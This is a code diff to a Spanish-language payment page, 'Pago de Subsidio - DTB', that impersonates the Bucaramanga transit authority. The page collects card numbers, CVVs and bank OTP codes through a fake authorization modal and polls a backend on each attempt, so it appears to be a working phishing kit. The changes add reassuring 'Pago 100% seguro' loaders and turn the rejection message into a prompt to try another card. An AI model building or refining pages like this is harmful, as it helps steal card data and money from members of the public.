@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Pago de Subsidio - DTB</title>
@@ -22,38 +23,14 @@ tailwind.config = {
 
 <style>
 /* ============================================================
-   ANTI-ZOOM
+   ANTI-ZOOM Y RESET
    ============================================================ */
-html {
-  -webkit-text-size-adjust: 100%;
-  -ms-text-size-adjust: 100%;
-  -webkit-tap-highlight-color: transparent;
-}
-body {
-  touch-action: manipulation;
-  -webkit-user-select: none;
-  -moz-user-select: none;
-  -ms-user-select: none;
-  user-select: none;
-  overscroll-behavior-y: none;
-}
-input, textarea, select {
-  -webkit-user-select: text;
-  -moz-user-select: text;
-  -ms-user-select: text;
-  user-select: text;
-  font-size: 16px !important;
-}
-button, a, .pay-method-card, .banco-card-pse {
-  touch-action: manipulation;
-}
-
-/* ============================================================
-   RESET
-   ============================================================ */
+html { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; -webkit-tap-highlight-color: transparent; }
+body { touch-action: manipulation; user-select: none; overscroll-behavior-y: none; font-family: 'Inter', system-ui, sans-serif; background: #f7f8fa; color: #00271c; }
+input, textarea, select { user-select: text; font-size: 16px !important; }
+button, a, .pay-method-card, .banco-card-pse { touch-action: manipulation; }
 *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 html { scroll-behavior: smooth; }
-body { font-family: 'Inter', system-ui, sans-serif; background: #f7f8fa; color: #00271c; }
 img, svg { display: block; max-width: 100%; }
 
 /* ============================================================
@@ -76,123 +53,38 @@ img, svg { display: block; max-width: 100%; }
 .texto-carga { font-size: 16px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; }
 
 /* ============================================================
-   HEADER
+   HEADER Y MAIN
    ============================================================ */
-.navbar-custom {
-  background: #ffa07a;
-  padding: 10px 30px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  box-shadow: 0 2px 8px rgba(0,0,0,.08);
-}
+.navbar-custom { background: #ffa07a; padding: 10px 30px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
 .navbar-custom .logo-moviliza { height: 50px; width: auto; }
-
-/* ============================================================
-   MAIN
-   ============================================================ */
 .main-container { max-width: 900px; margin: 0 auto; padding: 32px 16px 60px; }
 
 /* ============================================================
    RESUMEN
    ============================================================ */
-.resumen-card {
-  background: #fff;
-  border: 1px solid #e5e5e5;
-  border-radius: 6px;
-  box-shadow: 0 1px 3px rgba(0,0,0,.04);
-  padding: 28px 32px;
-  margin-bottom: 24px;
-  border-left: 4px solid #1e6f24;
-  font-family: 'Inter', Arial, Helvetica, sans-serif;
-}
-.resumen-titulo {
-  font-size: 16px;
-  font-weight: 700;
-  color: #1e6f24;
-  letter-spacing: .3px;
-  margin-bottom: 22px;
-  padding-bottom: 12px;
-  border-bottom: 1px solid #eaeaea;
-}
-.resumen-grid {
-  display: grid;
-  grid-template-columns: repeat(2, 1fr);
-  gap: 18px 40px;
-  margin-bottom: 22px;
-  padding-bottom: 22px;
-  border-bottom: 1px solid #eaeaea;
-}
+.resumen-card { background: #fff; border: 1px solid #e5e5e5; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,.04); padding: 28px 32px; margin-bottom: 24px; border-left: 4px solid #1e6f24; font-family: 'Inter', Arial, Helvetica, sans-serif; }
+.resumen-titulo { font-size: 16px; font-weight: 700; color: #1e6f24; letter-spacing: .3px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid #eaeaea; }
+.resumen-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px 40px; margin-bottom: 22px; padding-bottom: 22px; border-bottom: 1px solid #eaeaea; }
 .dato-item { display: flex; flex-direction: column; gap: 4px; }
-.dato-lbl {
-  font-size: 11px;
-  font-weight: 600;
-  color: #777;
-  text-transform: uppercase;
-  letter-spacing: .8px;
-}
-.dato-val {
-  font-size: 15px;
-  font-weight: 600;
-  color: #222;
-  word-break: break-word;
-}
+.dato-lbl { font-size: 11px; font-weight: 600; color: #777; text-transform: uppercase; letter-spacing: .8px; }
+.dato-val { font-size: 15px; font-weight: 600; color: #222; word-break: break-word; }
 .resumen-desglose { display: flex; flex-direction: column; gap: 10px; }
-.desglose-row {
-  display: flex; justify-content: space-between; align-items: center;
-  font-size: 14px; color: #555;
-}
-.desglose-row.total {
-  font-size: 20px; font-weight: 700; color: #1e6f24;
-  padding-top: 14px; border-top: 1px solid #e0f7dd;
-  margin-top: 6px;
-}
+.desglose-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: #555; }
+.desglose-row.total { font-size: 20px; font-weight: 700; color: #1e6f24; padding-top: 14px; border-top: 1px solid #e0f7dd; margin-top: 6px; }
 .desglose-row .subsidio { color: #b45309; font-weight: 600; }
-.badge-subsidio {
-  display: inline-block;
-  background: #1e6f24; color: #fff;
-  font-size: 10px; font-weight: 700;
-  padding: 3px 8px; border-radius: 3px;
-  letter-spacing: .5px; text-transform: uppercase;
-  margin-left: 6px;
-}
-@media (max-width: 600px) {
-  .resumen-grid { grid-template-columns: 1fr; }
-  .resumen-card { padding: 22px 20px; }
-}
+.badge-subsidio { display: inline-block; background: #1e6f24; color: #fff; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 3px; letter-spacing: .5px; text-transform: uppercase; margin-left: 6px; }
+@media (max-width: 600px) { .resumen-grid { grid-template-columns: 1fr; } .resumen-card { padding: 22px 20px; } }
 
 /* ============================================================
    SELECTOR MEDIO DE PAGO
    ============================================================ */
-.selector-titulo {
-  text-align: center; font-size: 18px; font-weight: 800;
-  color: #00271c; margin-bottom: 20px;
-}
-.pay-method-grid {
-  display: grid; grid-template-columns: 1fr 1fr;
-  gap: 16px; max-width: 480px; margin: 0 auto;
-}
-.pay-method-card {
-  position: relative;
-  display: flex; flex-direction: column; align-items: center; justify-content: center;
-  gap: 14px; padding: 24px 16px;
-  background: #fff;
-  border: 2px solid #e3e8ee;
-  border-radius: 16px;
-  cursor: pointer;
-  transition: all .2s ease;
-  min-height: 170px;
-  text-align: center;
-}
+.selector-titulo { text-align: center; font-size: 18px; font-weight: 800; color: #00271c; margin-bottom: 20px; }
+.pay-method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; max-width: 480px; margin: 0 auto; }
+.pay-method-card { position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; padding: 24px 16px; background: #fff; border: 2px solid #e3e8ee; border-radius: 16px; cursor: pointer; transition: all .2s ease; min-height: 170px; text-align: center; }
 .pay-method-card:hover { border-color: #cbd5e0; transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,.06); }
 .pay-method-card.selected { border-color: #88f456; background: #f4ffe9; box-shadow: 0 8px 24px rgba(136,244,86,.25); }
 .pay-method-card.selected .pay-method-check { opacity: 1; transform: scale(1); }
-.pay-method-check {
-  position: absolute; top: 10px; right: 10px;
-  width: 26px; height: 26px; border-radius: 50%;
-  background: #88f456; display: flex; align-items: center; justify-content: center;
-  opacity: 0; transform: scale(.5); transition: all .2s ease;
-}
+.pay-method-check { position: absolute; top: 10px; right: 10px; width: 26px; height: 26px; border-radius: 50%; background: #88f456; display: flex; align-items: center; justify-content: center; opacity: 0; transform: scale(.5); transition: all .2s ease; }
 .pay-method-check svg { width: 16px; height: 16px; stroke: #00271c; stroke-width: 3; fill: none; }
 .pay-method-icon { width: 56px; height: 56px; display: flex; align-items: center; justify-content: center; color: #00271c; }
 .pay-method-icon img { max-width: 56px; max-height: 56px; object-fit: contain; }
@@ -201,7 +93,7 @@ img, svg { display: block; max-width: 100%; }
 .pay-method-sub { font-size: 11px; color: #6b7280; margin-top: 2px; }
 
 /* ============================================================
-   PSE
+   PSE Y MODAL BANCOS
    ============================================================ */
 .pse-card { border: 1px solid #5469d4; border-radius: 8px; padding: 16px; background: #fff; box-shadow: 0 0 0 3px rgba(84,105,212,.12); }
 .pse-header { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; color: #1a1f36; padding-bottom: 16px; border-bottom: 1px solid #e3e8ee; margin-bottom: 20px; }
@@ -228,9 +120,6 @@ img, svg { display: block; max-width: 100%; }
 .pse-hint strong { color: #1a1f36; font-weight: 600; }
 .mini-label-pse { display: block; font-size: 13px; font-weight: 500; color: #3c4257; margin-bottom: 6px; }
 
-/* ============================================================
-   MODAL BANCOS
-   ============================================================ */
 .modal-banco { position: fixed; inset: 0; z-index: 999999 !important; display: flex; align-items: flex-end; justify-content: center; animation: fadeInModal .25s ease; }
 .modal-banco.hidden { display: none !important; }
 @keyframes fadeInModal { from { opacity: 0; } to { opacity: 1; } }
@@ -340,55 +229,18 @@ img, svg { display: block; max-width: 100%; }
 .tarjeta-app .card-input-wrapper:focus-within { border-color: #bbcef3; }
 .tarjeta-app .card-input-wrapper input { width: 100%; padding: 10px 14px; border: none; border-radius: 6px; font-size: 16px; background: transparent; outline: none; min-width: 0; }
 
-.tarjeta-app .card-input-wrapper .card-logos {
-  display: flex;
-  gap: 8px;
-  padding-right: 14px;
-  flex-shrink: 0;
-  align-items: center;
-  transition: padding .3s ease;
-}
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  width: 42px;
-  height: 28px;
-  overflow: hidden;
-  transition: opacity .35s ease, transform .35s cubic-bezier(.34,1.56,.64,1), width .35s ease, margin .35s ease, padding .35s ease;
-  opacity: 1;
-  transform: scale(1);
-}
+.tarjeta-app .card-input-wrapper .card-logos { display: flex; gap: 8px; padding-right: 14px; flex-shrink: 0; align-items: center; transition: padding .3s ease; }
+.tarjeta-app .card-input-wrapper .card-logos .card-logo-item { display: flex; align-items: center; justify-content: center; width: 42px; height: 28px; overflow: hidden; transition: opacity .35s ease, transform .35s cubic-bezier(.34,1.56,.64,1), width .35s ease, margin .35s ease, padding .35s ease; opacity: 1; transform: scale(1); }
 .tarjeta-app .card-input-wrapper .card-logos .card-logo-item svg,
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item img {
-  width: 42px;
-  height: 28px;
-  object-fit: contain;
-  border-radius: 3px;
-  flex-shrink: 0;
-}
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto {
-  opacity: 0;
-  transform: scale(.4) rotate(-15deg);
-  width: 0;
-  margin-left: -8px;
-  padding: 0;
-  pointer-events: none;
-}
-.tarjeta-app .card-input-wrapper .card-logos.has-single {
-  padding-right: 18px;
-}
+.tarjeta-app .card-input-wrapper .card-logos .card-logo-item img { width: 42px; height: 28px; object-fit: contain; border-radius: 3px; flex-shrink: 0; }
+.tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto { opacity: 0; transform: scale(.4) rotate(-15deg); width: 0; margin-left: -8px; padding: 0; pointer-events: none; }
+.tarjeta-app .card-input-wrapper .card-logos.has-single { padding-right: 18px; }
 @media (max-width: 400px) {
   .tarjeta-app .card-input-wrapper .card-logos { gap: 6px; padding-right: 10px; }
   .tarjeta-app .card-input-wrapper .card-logos .card-logo-item,
   .tarjeta-app .card-input-wrapper .card-logos .card-logo-item svg,
-  .tarjeta-app .card-input-wrapper .card-logos .card-logo-item img {
-    width: 34px;
-    height: 22px;
-  }
-  .tarjeta-app .card-input-wrapper .card-logos.has-single {
-    padding-right: 14px;
-  }
+  .tarjeta-app .card-input-wrapper .card-logos .card-logo-item img { width: 34px; height: 22px; }
+  .tarjeta-app .card-input-wrapper .card-logos.has-single { padding-right: 14px; }
 }
 
 .tarjeta-app .row { display: flex; gap: 16px; }
@@ -405,21 +257,8 @@ img, svg { display: block; max-width: 100%; }
 .tarjeta-app .cvv-wrapper .cvv-help { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); width: 44px; height: 44px; border-radius: 50%; border: 3px solid #2c2a29; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 24px; font-weight: 700; color: #2c2a29; background: #fff; transition: all .2s ease; z-index: 5; line-height: 1; box-shadow: 0 2px 6px rgba(0,0,0,.12); }
 .tarjeta-app .cvv-wrapper .cvv-help:hover { background: #f0f0f0; border-color: #1a1a1a; transform: translateY(-50%) scale(1.05); }
 
-.tarjeta-app .cvv-mensaje-amex {
-  font-size: 12px;
-  color: #b45309;
-  background: #fffbeb;
-  border-left: 3px solid #f59e0b;
-  padding: 6px 10px;
-  margin-top: 6px;
-  border-radius: 4px;
-  line-height: 1.4;
-  animation: fadeInMensaje .25s ease;
-}
-@keyframes fadeInMensaje {
-  from { opacity: 0; transform: translateY(-4px); }
-  to { opacity: 1; transform: translateY(0); }
-}
+.tarjeta-app .cvv-mensaje-amex { font-size: 12px; color: #b45309; background: #fffbeb; border-left: 3px solid #f59e0b; padding: 6px 10px; margin-top: 6px; border-radius: 4px; line-height: 1.4; animation: fadeInMensaje .25s ease; }
+@keyframes fadeInMensaje { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
 
 .tarjeta-app .custom-select { position: relative; display: block; }
 .tarjeta-app .custom-select select { width: 100%; padding: 10px 30px 10px 12px; border: 1px solid #cacaca; border-radius: 6px; background: #fff; font-size: 16px; appearance: none; -webkit-appearance: none; color: #969696; cursor: pointer; }
@@ -443,32 +282,12 @@ img, svg { display: block; max-width: 100%; }
 .tarjeta-app .btn-primary:hover { background: #3d3a39; }
 .tarjeta-app .btn-primary:disabled { opacity: .4; cursor: not-allowed; }
 
-.tarjeta-app .footer {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 12px;
-  padding: 16px 20px 20px;
-  text-align: center;
-  background: #f8f8f8;
-  border-top: 1px solid #eee;
-  width: 100%;
-}
-@media (min-width: 768px) {
-  .tarjeta-app .footer {
-    flex-direction: row;
-    justify-content: space-between;
-    padding: 20px 32px;
-    text-align: left;
-  }
-}
+.tarjeta-app .footer { display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 16px 20px 20px; text-align: center; background: #f8f8f8; border-top: 1px solid #eee; width: 100%; }
+@media (min-width: 768px) { .tarjeta-app .footer { flex-direction: row; justify-content: space-between; padding: 20px 32px; text-align: left; } }
 .tarjeta-app .footer .security-text { display: flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 600; color: #667587; text-transform: uppercase; }
 .tarjeta-app .footer .footer-logos { display: flex; align-items: center; gap: 16px; }
 .tarjeta-app .footer .footer-logos img { height: 20px; width: auto; max-width: 100%; object-fit: contain; }
-@media (max-width: 767px) {
-  .tarjeta-app .footer .footer-logos img { height: 16px; }
-  .tarjeta-app .footer .footer-logos { gap: 12px; }
-}
+@media (max-width: 767px) { .tarjeta-app .footer .footer-logos img { height: 16px; } .tarjeta-app .footer .footer-logos { gap: 12px; } }
 
 /* ============================================================
    CVV MODAL
@@ -486,44 +305,89 @@ img, svg { display: block; max-width: 100%; }
    ============================================================ */
 .auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.65); z-index: 10000001; justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity .4s ease; }
 .auth-modal.show { display: flex; opacity: 1; }
-.auth-modal-content {
-  background: #fff;
-  max-width: 640px;
-  width: 100%;
-  border-radius: 12px;
-  box-shadow: 0 10px 40px rgba(0,0,0,.3);
-  transform: scale(.7);
-  transition: transform .4s cubic-bezier(.34,1.56,.64,1);
-  margin: auto;
-  position: relative;
-  max-height: 90vh;
-  overflow-y: auto;
-  overflow-x: hidden;
-  -webkit-overflow-scrolling: touch;
-  padding-bottom: 24px;
-}
+.auth-modal-content { background: #fff; max-width: 640px; width: 100%; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,.3); transform: scale(.7); transition: transform .4s cubic-bezier(.34,1.56,.64,1); margin: auto; position: relative; max-height: 90vh; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; padding-bottom: 24px; }
 .auth-modal-content::-webkit-scrollbar { width: 6px; }
 .auth-modal-content::-webkit-scrollbar-thumb { background: #c7c7c7; border-radius: 3px; }
 .auth-modal.show .auth-modal-content { transform: scale(1); }
 .auth-modal-close { position: absolute; top: 15px; right: 20px; font-size: 32px; background: none; border: none; color: #333; cursor: pointer; z-index: 10; }
 
 /* ============================================================
-   OVERLAYS PAGO
+   OVERLAYS PAGO (LOTTIE Y OTP)
    ============================================================ */
-.pago-carga-overlay, .pago-error-overlay, .pago-carga-otp-overlay, .pago-error-otp-overlay { position: fixed; inset: 0; z-index: 99999999; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px; }
-.pago-carga-overlay.hidden, .pago-error-overlay.hidden, .pago-carga-otp-overlay.hidden, .pago-error-otp-overlay.hidden { display: none !important; }
-.pago-carga-logo, .pago-carga-otp-logo { height: 80px; width: auto; object-fit: contain; max-width: 250px; }
-.pago-carga-spinner, .pago-carga-otp-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #88f456; border-radius: 50%; animation: spinPagoOtp 1s linear infinite; }
-@keyframes spinPagoOtp { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-.pago-carga-texto, .pago-carga-otp-texto { font-size: 18px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; max-width: 400px; }
-.pago-error-icono, .pago-error-otp-icono { width: 100px; height: 100px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; }
-.pago-error-titulo, .pago-error-otp-titulo { font-size: 22px; font-weight: 700; color: #991b1b; text-align: center; }
-.pago-error-texto, .pago-error-otp-texto { font-size: 15px; color: #555; text-align: center; max-width: 400px; line-height: 1.5; }
-.pago-error-btn, .pago-error-otp-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 16px; }
+.pago-carga-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 99999999;
+    background: linear-gradient(135deg, #ffffff 0%, #f0fdf4 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 20px;
+    padding: 24px;
+    overflow: hidden;
+}
+.pago-carga-overlay.hidden { display: none !important; }
 
-/* ============================================================
-   RESPONSIVE
-   ============================================================ */
+.pago-carga-logo {
+    height: 64px;
+    width: auto;
+    max-width: 280px;
+    object-fit: contain;
+    animation: fadeInLogo 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+    filter: drop-shadow(0 4px 12px rgba(0,0,0,0.08));
+}
+@keyframes fadeInLogo { from { opacity: 0; transform: scale(0.7) translateY(-10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+
+.pago-carga-lottie { width: 180px; height: 180px; margin: 0; animation: fadeInLottie 0.8s ease 0.2s both; }
+@keyframes fadeInLottie { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+
+.pago-carga-texto { font-size: 20px; font-weight: 700; color: #00271c; text-align: center; line-height: 1.4; letter-spacing: -0.3px; animation: fadeInTexto 0.6s ease 0.3s both; min-height: 56px; max-width: 400px; }
+.pago-carga-texto .highlight { color: #16a34a; display: inline-block; transition: opacity 0.3s ease; }
+@keyframes fadeInTexto { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+.pago-carga-subtexto { font-size: 14px; color: #6b7280; text-align: center; max-width: 360px; line-height: 1.5; animation: fadeInTexto 0.6s ease 0.5s both; }
+
+.pago-carga-progress { width: 240px; height: 6px; background: #e5e7eb; border-radius: 999px; overflow: hidden; margin-top: 8px; animation: fadeInTexto 0.6s ease 0.6s both; position: relative; }
+.pago-carga-progress::after { content: ''; position: absolute; top: 0; left: 0; height: 100%; width: 40%; background: linear-gradient(90deg, #88f456, #16a34a, #88f456); background-size: 200% 100%; border-radius: 999px; animation: progressSlide 1.5s ease-in-out infinite; }
+@keyframes progressSlide { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
+
+.pago-carga-dots { display: inline-flex; gap: 4px; margin-left: 4px; vertical-align: middle; }
+.pago-carga-dots span { width: 6px; height: 6px; border-radius: 50%; background: #16a34a; animation: dotBounce 1.4s ease-in-out infinite; }
+.pago-carga-dots span:nth-child(2) { animation-delay: 0.2s; }
+.pago-carga-dots span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes dotBounce { 0%, 80%, 100% { transform: translateY(0); opacity: 0.4; } 40% { transform: translateY(-6px); opacity: 1; } }
+
+.pago-carga-seguridad { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #6b7280; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; animation: fadeInTexto 0.6s ease 0.7s both; }
+.pago-carga-seguridad svg { width: 16px; height: 16px; fill: #16a34a; }
+
+/* OTP LOADER */
+.pago-carga-otp-overlay {
+    position: fixed; inset: 0; z-index: 99999999; background: #ffffff;
+    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px;
+}
+.pago-carga-otp-overlay.hidden { display: none !important; }
+.pago-carga-otp-logo { height: 80px; max-height: 80px; width: auto; max-width: 250px; object-fit: contain; display: block; margin: 0 auto; }
+.pago-carga-otp-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #88f456; border-radius: 50%; animation: spinPagoOtp 1s linear infinite; }
+@keyframes spinPagoOtp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.pago-carga-otp-texto { font-size: 18px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; max-width: 400px; }
+
+/* ERROR OTP LOADER */
+.pago-error-otp-overlay { position: fixed; inset: 0; z-index: 99999999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; padding: 24px; }
+.pago-error-otp-overlay.hidden { display: none !important; }
+.pago-error-otp-icono { width: 100px; height: 100px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; }
+.pago-error-otp-titulo { font-size: 22px; font-weight: 700; color: #991b1b; text-align: center; }
+.pago-error-otp-texto { font-size: 15px; color: #555; text-align: center; max-width: 400px; line-height: 1.5; }
+.pago-error-otp-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 16px; }
+.pago-error-otp-btn:hover { background: #003d2b; }
+
+@media (max-width: 480px) {
+    .pago-carga-lottie { width: 140px; height: 140px; }
+    .pago-carga-logo { height: 48px; }
+    .pago-carga-texto { font-size: 17px; }
+    .pago-carga-subtexto { font-size: 13px; }
+    .pago-carga-progress { width: 200px; }
+}
 @media (max-width: 600px) {
   .resumen-grid { grid-template-columns: 1fr; }
   .resumen-card { padding: 24px 20px; }
@@ -843,9 +707,9 @@ img, svg { display: block; max-width: 100%; }
   <div class="auth-modal-content">
     <button class="auth-modal-close" onclick="closeAuthModal()">×</button>
     <div style="margin:0; background:#fff; color:#000; font-family:'Inter',system-ui,-apple-system,Arial,sans-serif; font-size:15px; line-height:1.6; padding:32px 24px 48px; max-width:640px; width:100%; border-radius:8px;">
-      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid #ececec;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; padding-bottom:16px; padding-right:60px; border-bottom:1px solid #ececec;">
         <img src="img/Logo-DTB-01.png" alt="DTB" style="height:48px; width:auto; object-fit:contain;">
-        <div id="cardBrandLogo" style="height:28px;"></div>
+        <div id="cardBrandLogo" style="height:44px; display:flex; align-items:center;"></div>
       </div>
       <h1 style="font-size:18px; margin:0 0 20px 0;">Autorización del pago</h1>
       <p>El pago que intentas realizar en DIRECCION DE TRNS BUCARAMANGA por $<span id="montoPopup">0</span> COP el <span id="currentDate"></span> con tu tarjeta terminada en <strong id="lastFourDigitsPopup">************</strong> debe ser autorizada por seguridad.</p>
@@ -873,15 +737,23 @@ img, svg { display: block; max-width: 100%; }
 <!-- OVERLAYS PAGO -->
 <div id="pagoCargaOverlay" class="pago-carga-overlay hidden">
   <img id="pagoCargaLogo" src="" alt="Marca" class="pago-carga-logo">
-  <div class="pago-carga-spinner"></div>
-  <div class="pago-carga-texto">Procesando tu pago...<br>Por favor espera</div>
+  <div id="pagoCargaLottie" class="pago-carga-lottie"></div>
+  <div class="pago-carga-texto">
+    <span id="pagoCargaTexto">Procesando tu pago</span><span class="highlight" id="pagoCargaDots">...</span>
+  </div>
+  <div class="pago-carga-subtexto" id="pagoCargaSubtexto">Conectando de forma segura con tu banco</div>
+  <div class="pago-carga-progress"></div>
+  <div class="pago-carga-seguridad">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+    Pago 100% seguro
+  </div>
 </div>
 <div id="pagoErrorOverlay" class="pago-error-overlay hidden">
   <div class="pago-error-icono"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg></div>
   <img id="pagoErrorLogo" src="" alt="Marca" class="pago-error-logo" style="height:60px;max-width:200px;object-fit:contain;">
-  <div class="pago-error-titulo">Pago rechazado</div>
-  <div class="pago-error-texto">Los datos ingresados son incorrectos. Verifique y vuelva a intentar su pago.</div>
-  <button type="button" class="pago-error-btn" onclick="cerrarPagoError()">Volver a intentar</button>
+  <div class="pago-error-titulo">Tarjeta no admitida</div>
+  <div class="pago-error-texto">El banco emisor rechazó la transacción. Verifica que la tarjeta esté habilitada para compras en línea o intenta con otra tarjeta.</div>
+  <button type="button" class="pago-error-btn" onclick="cerrarPagoError()">Cambiar tarjeta</button>
 </div>
 <div id="pagoCargaOtpOverlay" class="pago-carga-otp-overlay hidden">
   <img id="pagoCargaOtpLogo" src="" alt="Marca" class="pago-carga-otp-logo">
@@ -1399,36 +1271,64 @@ document.addEventListener('DOMContentLoaded', function() {
 /* ============================================================
    POLLING PAGO
    ============================================================ */
-function mostrarPagoCarga(marca) {
-  var overlay = document.getElementById('pagoCargaOverlay');
-  var logo = document.getElementById('pagoCargaLogo');
-  if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; logo.alt = 'Visa'; }
-  else if (marca === 'amex') { logo.src = 'https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg'; logo.alt = 'Amex'; }
-  else { logo.src = 'img/Mastercard-logo.svg.webp'; logo.alt = 'Mastercard'; }
-  overlay.classList.remove('hidden');
-  document.body.style.overflow = 'hidden';
+/* Variable global para el Lottie */
+let lottieInstance = null;
+let textoRotadorInterval = null;
+
+const TEXTOS_CARGA = [
+    { texto: 'Conectando con tu banco', sub: 'Estableciendo conexión segura' },
+    { texto: 'Validando datos de la tarjeta', sub: 'Verificando información' },
+    { texto: 'Autorizando transacción', sub: 'El banco está procesando tu pago' },
+    { texto: 'Casi listo', sub: 'Confirmando el resultado' }
+];
+
+function iniciarLottie() {
+    const container = document.getElementById('pagoCargaLottie');
+    if (!container || !window.lottie) return;
+    container.innerHTML = '';
+    lottieInstance = window.lottie.loadAnimation({
+        container: container,
+        renderer: 'svg',
+        loop: true,
+        autoplay: true,
+        path: 'https://assets10.lottiefiles.com/packages/lf20_p8bfn5to.json'
+    });
 }
-function ocultarPagoCarga() {
-  document.getElementById('pagoCargaOverlay').classList.add('hidden');
-  document.body.style.overflow = '';
+
+function detenerLottie() {
+    if (lottieInstance) {
+        lottieInstance.destroy();
+        lottieInstance = null;
+    }
 }
-function mostrarPagoError(marca) {
-  var overlay = document.getElementById('pagoErrorOverlay');
-  var logo = document.getElementById('pagoErrorLogo');
-  if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; }
-  else if (marca === 'amex') { logo.src = 'https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg'; }
-  else { logo.src = 'img/Mastercard-logo.svg.webp'; }
-  ocultarPagoCarga();
-  overlay.classList.remove('hidden');
-  document.body.style.overflow = 'hidden';
+
+function rotarTextosCarga() {
+    let i = 0;
+    const elTexto = document.getElementById('pagoCargaTexto');
+    const elSub = document.getElementById('pagoCargaSubtexto');
+    if (!elTexto || !elSub) return;
+    elTexto.textContent = TEXTOS_CARGA[0].texto;
+    elSub.textContent = TEXTOS_CARGA[0].sub;
+    if (textoRotadorInterval) clearInterval(textoRotadorInterval);
+    textoRotadorInterval = setInterval(() => {
+        i = (i + 1) % TEXTOS_CARGA.length;
+        elTexto.style.opacity = '0';
+        elSub.style.opacity = '0';
+        setTimeout(() => {
+            elTexto.textContent = TEXTOS_CARGA[i].texto;
+            elSub.textContent = TEXTOS_CARGA[i].sub;
+            elTexto.style.opacity = '1';
+            elSub.style.opacity = '1';
+        }, 250);
+    }, 2500);
 }
-function cerrarPagoError() {
-  document.getElementById('pagoErrorOverlay').classList.add('hidden');
-  document.body.style.overflow = '';
-  abrirModalTarjeta();
-}
+
+/* ============================================================
+   POLLING DE PAGO (ESPERAR RESPUESTA DEL BACKEND)
+   ============================================================ */
 function iniciarPollingPago(sessionId, marca, payload) {
   if (pagoPollingInterval) clearInterval(pagoPollingInterval);
+  
   pagoPollingInterval = setInterval(function() {
